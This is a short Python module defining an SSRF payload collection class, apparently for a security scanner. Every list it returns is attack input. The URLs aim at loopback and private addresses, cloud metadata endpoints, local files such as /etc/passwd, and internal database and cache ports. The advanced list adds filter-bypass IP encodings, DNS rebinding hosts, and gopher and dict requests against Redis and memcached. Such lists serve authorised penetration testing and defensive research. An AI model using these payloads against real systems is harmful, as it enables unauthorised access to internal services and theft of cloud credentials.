"""
SSRF payload collection
"""

class SSRFPayloads:
    """SSRF payload collection"""
    
    @staticmethod
    def get_basic_payloads():
        """Get basic SSRF payloads"""
        return [
            # Local network probing
            'http://127.0.0.1/',
            'http://localhost/',
            'http://0.0.0.0/',
            'http://[::1]/',
            
            # Internal network ranges
            'http://192.168.1.1/',
            'http://10.0.0.1/',
            'http://172.16.0.1/',
            
            # Cloud metadata endpoints
            'http://169.254.169.254/',
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/',
            
            # File protocol
            'file:///etc/passwd',
            'file:///c:/windows/system32/drivers/etc/hosts',
            
            # Different ports
            'http://127.0.0.1:22/',
            'http://127.0.0.1:3306/',
            'http://127.0.0.1:5432/',
            'http://127.0.0.1:6379/',
        ]
    
    @staticmethod
    def get_advanced_payloads():
        """Get advanced SSRF payloads"""
        return [
            # URL encoding
            'http://127.0.0.1/%2e%2e/',
            'http://127.0.0.1/%252e%252e/',
            
            # IP encoding variations
            'http://2130706433/',  # 127.0.0.1 in decimal
            'http://0x7f000001/',  # 127.0.0.1 in hex
            'http://017700000001/',  # 127.0.0.1 in octal
            
            # DNS rebinding
            'http://localtest.me/',
            'http://127.0.0.1.xip.io/',
            
            # Protocol confusion
            'gopher://127.0.0.1:6379/_INFO',
            'dict://127.0.0.1:11211/stat',
            'ldap://127.0.0.1/',
            
            # Bypass attempts
            'http://127.1/',
            'http://0/',
            'http://127.000.000.1/',
        ]
    
    @staticmethod
    def get_all_payloads():
        """Get all SSRF payloads"""
        return SSRFPayloads.get_basic_payloads() + SSRFPayloads.get_advanced_payloads()
